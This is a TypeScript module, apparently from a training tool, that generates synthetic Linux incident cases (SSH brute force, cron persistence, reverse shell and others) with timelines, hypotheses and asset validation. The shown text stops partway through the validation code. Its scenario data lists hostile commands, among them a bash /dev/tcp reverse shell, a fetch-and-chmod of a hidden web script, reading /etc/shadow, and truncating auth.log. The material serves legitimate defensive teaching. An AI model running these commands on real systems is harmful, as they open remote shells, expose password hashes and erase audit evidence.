import type { InvestigationWorld } from "../world";
import type { LinuxIncident } from "./incidents";
import { getLinuxIncidentProfile } from "./incidentProfiles";
import { resolveLinuxShellCommand } from "./commandSemantics";
import { linuxLocalCaseTimeToUtcTimestamp, linuxLocalTimestampPlusSeconds } from "./time";
import { buildLinuxDiversityProfile, rotateLinuxDiversityList } from "./diversityProfile";
import { linuxIndefiniteArticle } from "./grammar";
import { linuxReadOperandsHaveEvidence } from "./commandFileEvidence";

export type InvestigationTimelineEvent = {
  eventId: string;
  eventType: string;
  time: string;
  summary: string;
  evidenceType: "Observed" | "Inferred" | "Context" | "Background";
  source: string;
  confidence: "low" | "medium" | "high";
};

export type LinuxInvestigationContext = {
  incidentId: string;
  ticketId: string;
  changeId: string;
  incidentFamily: LinuxIncident["id"];
  incidentTitle: string;
  company: string;
  industry: string;
  department: string;
  officeLocation: string;
  domain: string;
  hostname: string;
  hostRole: string;
  operatingSystem: string;
  incidentDate: string;
  incidentTime: string;
  incidentWindowStart: string;
  incidentWindowEnd: string;
  timezone: string;
  primaryUser: string;
  secondaryUsers: string[];
  serviceAccounts: string[];
  adminAccounts: string[];
  hostIp: string;
  gateway: string;
  internalNetwork: string;
  externalIps: string[];
  dns: string;
  affectedService: string;
  suspiciousCommands: string[];
  suspiciousProcesses: string[];
  modifiedFiles: string[];
  modifiedConfigurations: string[];
  persistenceMethod: string;
  privilegeEscalationMethod: string;
  initialAccessMethod: string;
  timelineEvents: InvestigationTimelineEvent[];
  riskLevel: "medium" | "high" | "critical";
  businessImpact: string;
  rootCause: string;
  recommendedRemediation: string[];
  investigationMethodology: string[];
  plausibleHypotheses: string[];
  ambiguityNotes: string[];
};

export function csvEscape(value: unknown) {
  const text = String(value ?? "");
  if (/[",\r\n]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }

  return text;
}

export function csvRow(values: unknown[]) {
  return values.map(csvEscape).join(",");
}

function parseClock(value: string) {
  const [hour = "0", minute = "0", second = "0"] = value.split(":");
  return Number(hour) * 3600 + Number(minute) * 60 + Number(second);
}

function formatClock(totalSeconds: number, includeSeconds = true) {
  const day = 24 * 60 * 60;
  const normalized = ((totalSeconds % day) + day) % day;
  const hour = Math.floor(normalized / 3600);
  const minute = Math.floor((normalized % 3600) / 60);
  const second = normalized % 60;
  const base = `${String(hour).padStart(2, "0")}:${String(minute).padStart(2, "0")}`;

  return includeSeconds ? `${base}:${String(second).padStart(2, "0")}` : base;
}

export function incidentClock(
  context: Pick<LinuxInvestigationContext, "incidentTime">,
  offsetSeconds: number,
  includeSeconds = true
) {
  return formatClock(parseClock(context.incidentTime) + offsetSeconds, includeSeconds);
}

export function incidentTimestamp(
  context: Pick<LinuxInvestigationContext, "incidentDate" | "incidentTime"> & { timezone?: string },
  offsetSeconds: number
) {
  const base = linuxLocalCaseTimeToUtcTimestamp(context, context.incidentTime);
  const shifted = linuxLocalTimestampPlusSeconds(base, offsetSeconds, "UTC");
  if (!shifted) throw new Error(`Invalid Linux incident timestamp for ${context.incidentDate} ${context.incidentTime} ${context.timezone || "UTC"}`);
  return shifted;
}

export function incidentEventOffsets(seed: string) {
  const value = [...seed].reduce((total, char) => total + char.charCodeAt(0), 0);
  return {
    start: 9 + (value % 5),
    auth: 20 + (value % 7),
    command: 31 + (value % 8),
    file: 42 + (value % 6),
    service: 54 + (value % 9),
    close: 62 + (value % 6),
  };
}

function seededClock(seed: string, baseSeconds: number, spreadSeconds: number, salt: number) {
  const value = [...seed].reduce((total, char, index) => total + char.charCodeAt(0) * (index + salt), 0);
  return formatClock(baseSeconds + (value % spreadSeconds));
}

function extractSortableTimestamp(line: string) {
  const isoLike = line.match(/(\d{4}-\d{2}-\d{2})[ T]+(\d{2}:\d{2}:\d{2})/);
  if (isoLike) return `${isoLike[1]} ${isoLike[2]}`;

  const apache = line.match(/\[(\d{4}-\d{2}-\d{2}):(\d{2}:\d{2}:\d{2})/);
  if (apache) return `${apache[1]} ${apache[2]}`;

  return null;
}

function parseCsv(content: string, filePath: string) {
  const rows: string[][] = [];
  const lines = content.replace(/\r\n/g, "\n").replace(/\r/g, "\n").split("\n");

  for (const [lineIndex, line] of lines.entries()) {
    if (!line.trim()) continue;
    const row: string[] = [];
    let cell = "";
    let quoted = false;

    for (let index = 0; index < line.length; index += 1) {
      const char = line[index];
      const next = line[index + 1];

      if (quoted) {
        if (char === '"' && next === '"') {
          cell += '"';
          index += 1;
        } else if (char === '"') {
          quoted = false;
        } else {
          cell += char;
        }
      } else if (char === '"') {
        if (cell.length > 0) {
          throw new Error(
            `Linux asset validation failed: malformed CSV quote in ${filePath} line ${lineIndex + 1}.`
          );
        }
        quoted = true;
      } else if (char === ",") {
        row.push(cell);
        cell = "";
      } else {
        cell += char;
      }
    }

    if (quoted) {
      throw new Error(
        `Linux asset validation failed: unterminated CSV quote in ${filePath} line ${lineIndex + 1}.`
      );
    }

    row.push(cell);
    rows.push(row);
  }

  if (rows.length > 1) {
    const expected = rows[0].length;
    rows.slice(1).forEach((row, index) => {
      if (row.length !== expected) {
        throw new Error(
          `Linux asset validation failed: ${filePath} line ${index + 2} has ${row.length} columns, expected ${expected}.`
        );
      }
    });
  }

  return rows;
}

function timestampsFromContent(content: string, filePath: string) {
  if (filePath.endsWith("apt_history.log")) {
    return [...content.matchAll(/Start-Date:\s+(\d{4}-\d{2}-\d{2})\s+(\d{2}:\d{2}:\d{2})/g)].map(
      (match) => `${match[1]} ${match[2]}`
    );
  }

  return content
    .split("\n")
    // Collection/coverage comments describe an interval, not an emitted log event.
    .filter((line) => !line.trimStart().startsWith("#"))
    .map(extractSortableTimestamp)
    .filter((timestamp): timestamp is string => Boolean(timestamp));
}

function ensureChronological(filePath: string, content: string) {
  const timestamps = timestampsFromContent(content, filePath);
  const sorted = [...timestamps].sort();

  if (timestamps.some((timestamp, index) => timestamp !== sorted[index])) {
    throw new Error(`Linux asset validation failed: ${filePath} is not chronological.`);
  }
}

function ensureNoMechanicalCadence(filePath: string, content: string) {
  const seconds = timestampsFromContent(content, filePath).map((timestamp) => {
    const [, clock = "00:00:00"] = timestamp.split(" ");
    return parseClock(clock);
  });
  if (seconds.length < 40) return;

  const deltas = seconds
    .slice(1)
    .map((second, index) => second - seconds[index])
    .filter((delta) => delta > 0);
  const counts = new Map<number, number>();
  for (const delta of deltas) {
    counts.set(delta, (counts.get(delta) || 0) + 1);
  }

  for (const [delta, count] of counts) {
    const commonCadence = [60, 120, 300, 600, 900, 1800, 3480, 3600].includes(delta);
    const dominates = count / Math.max(1, deltas.length) > 0.32;
    if (count >= 12 && (commonCadence || dominates)) {
      throw new Error(
        `Linux asset validation failed: ${filePath} has mechanical timestamp cadence.`
      );
    }
  }
}

export function sortLogLines(content: string) {
  return content
    .split("\n")
    .map((line, index) => ({ line, index, timestamp: extractSortableTimestamp(line) }))
    .filter((entry) => entry.line.trim())
    .sort((left, right) => {
      if (!left.timestamp && !right.timestamp) return left.index - right.index;
      if (!left.timestamp) return -1;
      if (!right.timestamp) return 1;
      const byTime = left.timestamp.localeCompare(right.timestamp);
      return byTime || left.index - right.index;
    })
    .map((entry) => entry.line)
    .join("\n");
}

function hostIp(world: InvestigationWorld, hostOctet: number) {
  const parts = world.gatewayIp.split(".");
  return `${parts[0]}.${parts[1]}.${parts[2]}.${hostOctet}`;
}

function at(context: Pick<LinuxInvestigationContext, "incidentDate"> & { timezone?: string }, time: string) {
  return linuxLocalCaseTimeToUtcTimestamp(context, time);
}

function byFamily<T>(
  incident: LinuxIncident,
  values: Record<LinuxIncident["id"], T>
) {
  return values[incident.id];
}

function validationCommandVariants(command: string, context: LinuxInvestigationContext) {
  const homeDirectory = `/home/${context.primaryUser}`;
  const resolved = resolveLinuxShellCommand(command, {
    invokingHomeDirectory: homeDirectory,
    workingDirectory: homeDirectory,
  }).renderedCommand;
  return Array.from(new Set([
    command,
    resolved,
    command.replace("~/.ssh/authorized_keys", `/home/${context.primaryUser}/.ssh/authorized_keys`),
  ].filter(Boolean)));
}

function methodologyFor(incident: LinuxIncident) {
  const flows: Record<LinuxIncident["id"], string[]> = {
    ssh_bruteforce: [
      "Authentication Pattern Analysis",
      "Source Attribution",
      "Timeline Reconstruction",
      "Service Exposure Review",
      "Control Gap Assessment",
      "Remediation Decision",
    ],
    service_account_misuse: [
      "Account Validation",
      "Shell Policy Review",
      "Privilege Mapping",
      "Scheduled Task Review",
      "Business Impact Assessment",
      "Executive Brief",
    ],
    docker_compromise: [
      "Container Inventory",
      "Image and Runtime Review",
      "Network Exposure Analysis",
      "Host Boundary Indicators",
      "Persistence Review",
      "Recovery Plan",
    ],
    systemd_persistence: [
      "Startup Service Review",
      "Unit File Analysis",
      "Timeline Reconstruction",
      "Parent Process Review",
      "Evidence Correlation",
      "Disablement Plan",
    ],
    cron_persistence: [
      "Scheduled Job Review",
      "Script Analysis",
      "Execution Timeline",
      "User Attribution",
      "Containment Decision",
      "Monitoring Follow-up",
    ],
    ssh_key_compromise: [
      "Key Inventory",
      "Source Network Analysis",
      "Maintenance Correlation",
      "Account Ownership Review",
      "Trust Boundary Decision",
      "Key Rotation Plan",
    ],
    misconfigured_sudoers: [
      "Change Record Review",
      "Sudo Rule Analysis",
      "Command Attribution",
      "Policy Exception Review",
      "Privilege Boundary Assessment",
      "Cleanup Plan",
    ],
    unauthorized_package_install: [
      "Package Timeline",
      "Change Request Comparison",
      "Repository Validation",
      "Binary Exposure Review",
      "Rollback Decision",
      "Approval Follow-up",
    ],
    data_staging: [
      "File Discovery",
      "Archive Scope Analysis",
      "Account Purpose Review",
      "Transfer Evidence Review",
      "Business Data Impact",
      "Containment Decision",
    ],
    log_tampering: [
      "Log Gap Analysis",
      "Secondary Source Correlation",
      "Rotation Attribution",
      "Monitoring Confidence Review",
      "Evidence Preservation",
      "Detection Recovery",
    ],
    reverse_shell: [
      "Network Session Triage",
      "Process Ancestry Review",
      "Application Log Correlation",
      "Egress Control Review",
      "Containment Decision",
      "Web Hardening Plan",
    ],
  };

  return flows[incident.id];
}

function hypothesesFor(
  world: InvestigationWorld,
  incident: LinuxIncident
) {
  const shared = [
    "benign operational activity with incomplete documentation",
    "administrator or operator error under time pressure",
  ];
  const byFamily: Record<LinuxIncident["id"], string[]> = {
    ssh_bruteforce: [
      "legacy password authentication exception",
      "credential misuse from an unfamiliar source",
      "dormant account access requiring owner confirmation",
    ],
    service_account_misuse: [
      "automation account configured with an unnecessary interactive shell",
      "service credential misuse by an operator or unauthorised party",
      "backup or sync workflow running outside expected controls",
    ],
    docker_compromise: [
      "container workload started with overly broad host mounts",
      "stale docker group membership expanding host access",
      "container boundary exposure affecting shared paths",
    ],
    systemd_persistence: [
      "unapproved service unit introduced during troubleshooting",
      "failed service recovery that created a new daemon path",
      "persistence-like unit requiring ownership validation",
    ],
    cron_persistence: [
      "abandoned scheduled job still executing",
      "undocumented automation owned by a service or contractor account",
      "persistence-like cron entry requiring script review",
    ],
    ssh_key_compromise: [
      "stale contractor key retained beyond its expected window",
      "shared or copied SSH key material",
      "valid key use from an unexpected source network",
    ],
    misconfigured_sudoers: [
      "stale sudo exception granting excessive command access",
      "temporary user role drift",
      "policy gap allowing privileged service control",
    ],
    unauthorized_package_install: [
      "ad hoc troubleshooting package installed without approval",
      "repository or package source drift",
      "network-capable utility introduced to a production host",
    ],
    data_staging: [
      "manual backup troubleshooting that left temporary archives",
      "unapproved staging of business data",
      "service account used for file collection outside normal scope",
    ],
    log_tampering: [
      "manual rotation or retention issue during active review",
      "telemetry loss caused by noisy or misconfigured logging",
      "intentional log clearing requiring secondary-source correlation",
    ],
    reverse_shell: [
      "web maintenance task with unusual process ancestry",
      "application exploit producing shell-like execution",
      "egress control drift allowing unexpected outbound sessions",
    ],
  };

  return [...byFamily[incident.id], ...shared, `${world.serverRole} ownership mismatch`];
}

function ambiguitiesFor(world: InvestigationWorld, incident: LinuxIncident) {
  const byFamily: Record<LinuxIncident["id"], string[]> = {
    ssh_bruteforce: [
      `${world.ticketId} does not fully explain the authentication source pattern.`,
      "Successful login context must be compared with failed attempts and account ownership.",
    ],
    service_account_misuse: [
      "Interactive service-account behaviour needs to be separated from scheduled automation.",
      `${world.department} ownership records do not fully explain the shell activity.`,
    ],
    docker_compromise: [
      "Container runtime evidence must be compared with group membership and mounted paths.",
      `${world.changeId} may not describe the runtime profile in enough detail.`,
    ],
    systemd_persistence: [
      "Service state alone does not prove whether the unit is approved.",
      `The ${world.serverRole} baseline must be checked against unit and inventory evidence.`,
    ],
    cron_persistence: [
      "Scheduled execution requires script ownership and timing correlation.",
      `${world.ticketId} gives operational context but not complete job ownership.`,
    ],
    ssh_key_compromise: [
      "Key provenance and source network both need independent corroboration.",
      `${world.changeId} may not cover every key observed in SSH evidence.`,
    ],
    misconfigured_sudoers: [
      "Privileged command intent cannot be inferred from sudo logs alone.",
      "Group membership, sudoers content, and policy expectations must be compared.",
    ],
    unauthorized_package_install: [
      "Package history needs inventory and change-record comparison before classification.",
      "The package may be troubleshooting tooling or unapproved software.",
    ],
    data_staging: [
      "Archive scope is inferred from paths and commands, not live file inspection.",
      `Backup expectations for ${world.businessApplication} require validation.`,
    ],
    log_tampering: [
      "A log gap is not automatically malicious without secondary telemetry.",
      "Journal and audit records must be used to estimate evidence confidence.",
    ],
    reverse_shell: [
      "Web logs do not prove process intent without runtime correlation.",
      "Outbound network evidence must be compared with firewall and application context.",
    ],
  };

  return byFamily[incident.id];
}

export function buildLinuxInvestigationContext(
  world: InvestigationWorld,
  incident: LinuxIncident,
  difficulty = "Intermediate"
): LinuxInvestigationContext {
  const profile = getLinuxIncidentProfile(incident);
  const diversity = buildLinuxDiversityProfile({ world, incidentFamily: incident.id, difficulty });
  const base = {
    incidentDate: world.incidentDate,
    incidentTime: incident.triggerTime,
    timezone: world.timezone,
  };
  const offsets = diversity.timelineOffsets;
  const backgroundSeed = `${world.caseId}:${world.host}:${incident.id}:${world.department}`;
  const windowStart = incidentClock(base, 0, false);
  const windowEnd = incidentClock(base, diversity.windowMinutes * 60, false);

  const commandSet = byFamily(incident, {
    ssh_bruteforce: [
      "journalctl -u ssh",
      "grep Failed /var/log/auth.log",
      "systemctl status ssh.service",
    ],
    misconfigured_sudoers: [
      "cat /etc/shadow",
      `systemctl status ${incident.affectedService}`,
      `systemctl reload ${incident.affectedService}`,
    ],
    service_account_misuse: [
      "tar -czf /tmp/home-backup.tar.gz /home",
      "rsync -av /srv/shared /tmp/export",
      "systemctl restart ssh",
    ],
    ssh_key_compromise: [
      `cat /home/${incident.primaryUser}/.ssh/authorized_keys`,
      `stat /home/${incident.primaryUser}/.ssh/authorized_keys`,
      "journalctl -u ssh",
    ],
    cron_persistence: [
      "cat /etc/cron.d/platform-sync",
      "stat /etc/cron.d/platform-sync",
      "grep -n platform-sync /etc/cron.d/platform-sync",
    ],
    systemd_persistence: [
      "systemctl enable --now metrics-cache.service",
      "systemctl status metrics-cache.service",
      "cat /etc/systemd/system/metrics-cache.service",
    ],
    unauthorized_package_install: [
      "apt install ncat",
      "dpkg -L ncat",
      "apt-cache policy ncat",
    ],
    data_staging: [
      `tar -czf /tmp/${world.caseId.toLowerCase()}-bundle.tar.gz /srv/shared`,
      "rsync -av /srv/shared /tmp/export",
      "ls -lh /tmp",
    ],
    log_tampering: [
      "truncate -s 0 /var/log/auth.log",
      "logrotate -f /etc/logrotate.conf",
      "journalctl -u ssh",
    ],
    reverse_shell: [
      `bash -c 'bash -i >& /dev/tcp/${incident.suspiciousIp}/4444 0>&1'`,
      "curl -o /tmp/update.sh",
      "chmod +x /var/www/html/assets/.cache/update.sh",
    ],
    docker_compromise: [
      "docker run --name portal-worker -d -v /srv/shared:/mnt/shared:ro registry.local/platform/portal-worker:2026.07",
      "docker inspect portal-worker",
      "cat /etc/group",
    ],
  });
  // Keep the family-defining action. Vary the subsequent observed work, not
  // names or argument spelling: collection, policy inspection and service
  // interruption/recovery have different command and state-transition graphs.
  const variant = diversity.evidenceVariant % 4;
  const investigationCommands = variant === 0 ? commandSet : byFamily(incident, {
    misconfigured_sudoers: variant === 1
      ? [commandSet[0], `systemctl stop ${incident.affectedService}`, `systemctl start ${incident.affectedService}`, "cat /etc/sudoers.d/temp-maintenance"]
      : variant === 2 ? [commandSet[0], `systemctl reload ${incident.affectedService}`]
      : [commandSet[0], "cat /etc/sudoers.d/temp-maintenance", `systemctl status ${incident.affectedService}`, `systemctl restart ${incident.affectedService}`],
    ssh_bruteforce: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "cat /etc/ssh/sshd_config", ...(variant === 3 ? ["stat /var/log/auth.log"] : [])],
    ssh_key_compromise: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "cat /etc/ssh/sshd_config", ...(variant === 3 ? ["cat /etc/passwd"] : [])],
    cron_persistence: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "cat /etc/crontab", ...(variant === 3 ? ["systemctl status cron.service"] : [])],
    systemd_persistence: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "systemctl stop metrics-cache.service", ...(variant === 3 ? ["systemctl start metrics-cache.service"] : [])],
    unauthorized_package_install: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "cat /var/log/dpkg.log", ...(variant === 3 ? ["stat /var/lib/dpkg/status"] : [])],
    service_account_misuse: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "cat /etc/sudoers.d/platform"],
    data_staging: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "stat /tmp/export", ...(variant === 3 ? ["cat /etc/sudoers.d/platform"] : [])],
    log_tampering: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "stat /var/log/auth.log", ...(variant === 3 ? ["cat /etc/logrotate.conf"] : [])],
    reverse_shell: commandSet,
    docker_compromise: variant === 1 ? commandSet.slice(0, 2)
      : [...commandSet, "stat /var/run/docker.sock"],
  });
  const suspiciousCommands = ["ssh_bruteforce", "ssh_key_compromise", "cron_persistence"].includes(incident.id)
    ? rotateLinuxDiversityList(investigationCommands, diversity.taskVariant)
    : investigationCommands;

  const modifiedFiles = byFamily(incident, {
    ssh_bruteforce: ["/var/log/auth.log", "/etc/ssh/sshd_config"],
    misconfigured_sudoers: ["/etc/sudoers.d/temp-maintenance", "/etc/shadow"],
    service_account_misuse: ["/tmp/home-backup.tar.gz", "/tmp/export"],
    ssh_key_compromise: [`/home/${incident.primaryUser}/.ssh/authorized_keys`],
    cron_persistence: ["/etc/cron.d/platform-sync", "/usr/local/sbin/platform-sync.sh"],
    systemd_persistence: ["/etc/systemd/system/metrics-cache.service"],
    unauthorized_package_install: ["/var/log/apt/history.log", "/usr/bin/ncat"],
    data_staging: [`/tmp/${world.caseId.toLowerCase()}-bundle.tar.gz`],
    log_tampering: ["/var/log/auth.log", "/var/log/auth.log.1"],
    reverse_shell: ["/var/www/html/assets/.cache/update.sh"],
    docker_compromise: ["/var/lib/docker/containers/portal-worker", "/srv/shared"],
  });

  const modifiedConfigurations = byFamily(incident, {
    ssh_bruteforce: ["/etc/ssh/sshd_config"],
    misconfigured_sudoers: ["/etc/sudoers.d/temp-maintenance"],
    service_account_misuse: ["/etc/passwd", "/etc/sudoers.d/platform"],
    ssh_key_compromise: [`/home/${incident.primaryUser}/.ssh/authorized_keys`],
    cron_persistence: ["/etc/cron.d/platform-sync"],
    systemd_persistence: ["/etc/systemd/system/metrics-cache.service"],
    unauthorized_package_install: ["/etc/apt/sources.list.d/internal.list"],
    data_staging: ["/usr/local/sbin/archive-staging-review.sh"],
    log_tampering: ["/etc/logrotate.conf"],
    reverse_shell: ["/etc/ufw/user.rules"],
    docker_compromise: ["/etc/docker/daemon.json"],
  });

  const actor = incident.primaryUser;
  const sourceIp = incident.suspiciousIp;
  const firstCommand = suspiciousCommands[0];
  const primaryFile = modifiedFiles[0];
  const serviceOrRuntime =
    incident.id === "unauthorized_package_install"
      ? "APT transaction"
      : `${incident.affectedService} state`;
  const incidentStartSummary = byFamily(incident, {
    ssh_bruteforce: `incident window opened around SSH password attempts against ${actor} from ${sourceIp}`,
    misconfigured_sudoers: `${actor} opened a sudo path toward ${firstCommand} from ${sourceIp}`,
    service_account_misuse: `incident window opened around ${actor} interactive file-handling from ${sourceIp} on ${world.host}`,
    ssh_key_compromise: `incident window opened around public-key SSH activity for ${actor} from ${sourceIp}`,
    cron_persistence: `incident window opened around ${actor} scheduled-job evidence for ${primaryFile}`,
    systemd_persistence: `incident window opened around ${actor} systemd changes for metrics-cache.service`,
    unauthorized_package_install: `incident window opened around ${actor} package-management activity for ncat outside ${world.changeId}`,
    data_staging: `incident window opened around ${actor} staging archive activity for ${primaryFile}`,
    log_tampering: `incident window opened around ${actor} log-handling activity against ${primaryFile}`,
    reverse_shell: `incident window opened around web process activity from ${sourceIp} reaching ${world.host}`,
    docker_compromise: `incident window opened around ${actor} docker.service runtime evidence for portal-worker`,
  });
  const authSummary = byFamily(incident, {
    ssh_bruteforce: `${actor} SSH authentication evidence appears with source ${sourceIp}`,
    misconfigured_sudoers: `${actor} session from ${sourceIp} precedes sudo use`,
    service_account_misuse: `${actor} interactive session from ${sourceIp} differs from service-account baseline`,
    ssh_key_compromise: `${actor} public-key login from ${sourceIp} requires key-owner validation`,
    cron_persistence: `${actor} shell activity from ${sourceIp} precedes cron file changes`,
    systemd_persistence: `${actor} session from ${sourceIp} precedes metrics-cache.service enablement`,
    unauthorized_package_install: `${actor} authenticated from ${sourceIp} before the ncat package transaction`,
    data_staging: `${actor} session from ${sourceIp} precedes archive creation`,
    log_tampering: `${actor} session from ${sourceIp} precedes auth.log truncation evidence`,
    reverse_shell: `${sourceIp} web request activity aligns with shell process evidence`,
    docker_compromise: `${world.analystUser} session from ${world.adminIp} precedes docker socket evidence for ${actor}`,
  });
  const serviceSummary = byFamily(incident, {
    ssh_bruteforce: `${incident.affectedService} logs show SSH authentication pressure for ${actor}`,
    misconfigured_sudoers: `${incident.affectedService} baseline should be compared with ${world.changeId}`,
    service_account_misuse: `${incident.affectedService} evidence should be reconciled with ${actor} account purpose`,
    ssh_key_compromise: `${incident.affectedService} journal entries reference key-based access for ${actor}`,
    cron_persistence: `${incident.affectedService} scheduled execution references ${primaryFile}`,
    systemd_persistence: `metrics-cache.service state appears in systemd evidence`,
    unauthorized_package_install: `APT history records ncat install activity and dpkg status changes`,
    data_staging: `${incident.affectedService} and process evidence reference ${primaryFile}`,
    log_tampering: `${incident.affectedService} and journal evidence should be compared with ${primaryFile}`,
    reverse_shell: `apache2.service process evidence aligns with outbound shell activity to ${sourceIp}`,
    docker_compromise: `docker.service evidence references portal-worker and /srv/shared mount activity`,
  });

  const timelineEvents: InvestigationTimelineEvent[] = [
    {
      eventId: `${world.caseId}:background-package-timer`,
      eventType: "background_activity",
      time: at(base, seededClock(backgroundSeed, 7 * 3600 + 42 * 60, 3600, 5)),
      summary: `routine package timer and ${world.serverRole} operational checks started`,
      evidenceType: "Background",
      source: "syslog;apt_history.log",
      confidence: "high",
    },
    {
      eventId: `${world.caseId}:background-analyst-login`,
      eventType: "background_activity",
      time: at(base, seededClock(backgroundSeed, 8 * 3600 + 5 * 60, 2800, 11)),
      summary: `${world.analystUser} authenticated from ${world.adminIp} for routine SOC review`,
      evidenceType: "Background",
      source: "auth.log;journal_ssh.txt",
      confidence: "high",
    },
    {
      eventId: `${world.caseId}:case-boundary`,
      eventType: "case_boundary",
      time: incidentTimestamp(base, offsets.start),
      summary: incidentStartSummary,
      evidenceType: "Inferred",
      source: "auth.log;audit.log",
      confidence: "high",
    },
    {
      eventId: `${world.caseId}:ssh-auth`,
      eventType: "ssh_session_open",
      time: incidentTimestamp(base, offsets.auth),
      summary: authSummary,
      evidenceType: "Observed",
      source: "auth.log;journal_ssh.txt",
      confidence: "high",
    },
    {
      eventId: `${world.caseId}:sudo-command`,
      eventType: "sudo_command",
      time: incidentTimestamp(base, offsets.commands[0]),
      summary: suspiciousCommands[0],
      evidenceType: "Observed",
      source: "sudo.log;audit.log;process_snapshot.txt",
      confidence: "high",
    },
    {
      eventId: `${world.caseId}:file-touch`,
      eventType: "file_write",
      time: incidentTimestamp(base, offsets.file),
      summary: `${actor} evidence references ${primaryFile} during ${serviceOrRuntime}`,
      evidenceType: "Observed",
      source: "syslog;audit.log;cron.log;open_files.txt",
      confidence: "medium",
    },
    {
      eventId: `${world.caseId}:service-state`,
      eventType: incident.id === "unauthorized_package_install" ? "package_install" : incident.id === "systemd_persistence" ? "service_start" : "service_reload",
      time: incidentTimestamp(base, offsets.service),
      summary: serviceSummary,
      evidenceType: "Observed",
      source: "syslog;journal_systemd.txt;service_inventory.txt",
      confidence: "medium",
    },
    {
      eventId: `${world.caseId}:analyst-review`,
      eventType: "analyst_action",
      time: at(base, seededClock(backgroundSeed, 10 * 3600 + 25 * 60, 4200, 17)),
      summary: `${world.analystUser} began containment-oriented evidence review from ${world.adminIp}`,
      evidenceType: "Context",
      source: "sudo.log;analyst_working_notes.md",
      confidence: "medium",
    },
  ];

  timelineEvents.sort((left, right) => left.time.localeCompare(right.time));
  const plausibleHypotheses = hypothesesFor(world, incident);
  const ambiguityNotes = ambiguitiesFor(world, incident);

  return {
    incidentId: world.caseId,
    ticketId: world.ticketId,
    changeId: world.changeId,
    incidentFamily: incident.id,
    incidentTitle: incident.label,
    company: world.company,
    industry: world.industry,
    department: world.department,
    officeLocation: world.location,
    domain: world.domain,
    hostname: world.host,
    hostRole: world.serverRole,
    operatingSystem: "Ubuntu Server 24.04 LTS",
    incidentDate: world.incidentDate,
    incidentTime: incident.triggerTime,
    incidentWindowStart: windowStart,
    incidentWindowEnd: windowEnd,
    timezone: world.timezone,
    primaryUser: incident.primaryUser,
    secondaryUsers: [world.analystUser, world.employeeUser, world.contractorUser],
    serviceAccounts: [world.serviceUser, world.appUser],
    adminAccounts: [world.adminUser, world.analystUser],
    hostIp: hostIp(world, 42),
    gateway: world.gatewayIp,
    internalNetwork: world.cidr,
    externalIps: [incident.suspiciousIp, world.adminIp, world.backupIp],
    dns: world.dnsIp,
    affectedService: incident.affectedService,
    suspiciousCommands,
    suspiciousProcesses: byFamily(incident, {
      ssh_bruteforce: ["sshd"],
      misconfigured_sudoers: ["sudo", "systemctl"],
      service_account_misuse: ["tar", "rsync"],
      ssh_key_compromise: ["sshd"],
      cron_persistence: ["cron", "platform-sync.sh"],
      systemd_persistence: ["metrics-cache", "systemd"],
      unauthorized_package_install: ["apt", "ncat"],
      data_staging: ["tar", "rsync"],
      log_tampering: ["logrotate", "truncate"],
      reverse_shell: ["bash", "apache2"],
      docker_compromise: ["dockerd", "containerd"],
    }),
    modifiedFiles,
    modifiedConfigurations,
    persistenceMethod:
      incident.id === "cron_persistence"
        ? "cron entry"
        : incident.id === "systemd_persistence"
        ? "systemd service"
        : incident.id === "ssh_key_compromise"
        ? "trusted SSH key"
        : "not confirmed",
    privilegeEscalationMethod:
      incident.id === "misconfigured_sudoers"
        ? "overly broad sudoers rule"
        : incident.id === "docker_compromise"
        ? "docker group or host mount exposure"
        : "not confirmed",
    initialAccessMethod:
      incident.id === "ssh_key_compromise"
        ? "valid SSH key from unfamiliar source"
        : incident.id === "ssh_bruteforce"
        ? "password login after repeated SSH failures"
        : "interactive authenticated session requiring validation",
    timelineEvents,
    riskLevel: profile.risks.length > 3 ? "high" : "medium",
    businessImpact: `${world.department} may face disruption or data exposure on ${world.host}, ${linuxIndefiniteArticle(world.serverRole)} ${world.serverRole}.`,
    rootCause: profile.risks[0],
    recommendedRemediation: [
      profile.configFocus[0] ? `Review ${profile.configFocus[0]}.` : "Review affected configuration.",
      "Rotate or disable exposed credentials where evidence supports compromise.",
      `Validate ownership of ${incident.primaryUser} activity with ${world.department}.`,
      "Add monitoring for the confirmed evidence pattern.",
    ],
    investigationMethodology: methodologyFor(incident),
    plausibleHypotheses,
    ambiguityNotes,
  };
}

export function timelineCsv(context: LinuxInvestigationContext) {
  const learnerTimelineRef = (value: string) =>
    value
      .replace(/\bidentity:([A-Za-z0-9._-]+)/g, "the $1 account")
      .replace(/\bsession:ssh:[A-Za-z0-9._:-]+/g, "the SSH session")
      .replace(/\bcommand:[A-Za-z0-9._:-]+/g, "the observed command")
      .replace(/\bprocess:[A-Za-z0-9._:-]+/g, "the related process")
      .replace(/\bfile:([A-Za-z0-9._:-]+)/g, (_, slug: string) => `/${slug.replace(/-/g, "/")}`)
      .replace(/\bprimary-window\b/g, "approved maintenance window")
      .replace(/\bincident-primary\b/g, "primary incident activity")
      .replace(/[_-]+/g, " ")
      .trim();
  return `timestamp,event,evidence_type,source,confidence,activity_ref,activity_type
${context.timelineEvents
  .map((event) =>
    csvRow([event.time, event.summary, event.evidenceType, event.source, event.confidence, learnerTimelineRef(event.eventId || event.summary), learnerTimelineRef(event.eventType)])
  )
  .join("\n")}
`;
}

export function validateLinuxInvestigationAssets(
  context: LinuxInvestigationContext,
  assets: { file_path: string; content: string }[]
) {
  const joined = assets.map((asset) => asset.content).join("\n");
  const requiredValues = [
    context.incidentId,
    context.hostname,
    context.primaryUser,
    context.affectedService,
    context.incidentDate,
    context.hostIp,
    context.gateway,
    context.dns,
    context.ticketId,
    context.changeId,
  ];

  for (const value of requiredValues) {
    if (!joined.includes(value)) {
      throw new Error(`Linux asset validation failed: missing ${value}.`);
    }
  }

  if (/\b\d{2}:\d{2}\d{2}:\d{2}\b/.test(joined)) {
    throw new Error("Linux asset validation failed: malformed time range missing separator.");
  }

  if (/\bwith a\s*(?:\r?\n|$)|cron,\s*auth\s*(?:\r?\n|$)/im.test(joined)) {
    throw new Error("Linux asset validation failed: dangling or truncated narrative copy detected.");
  }

  if (
    /\b(withSSH|usingSSH|withcron|changee|610 line)\b/i.test(joined) ||
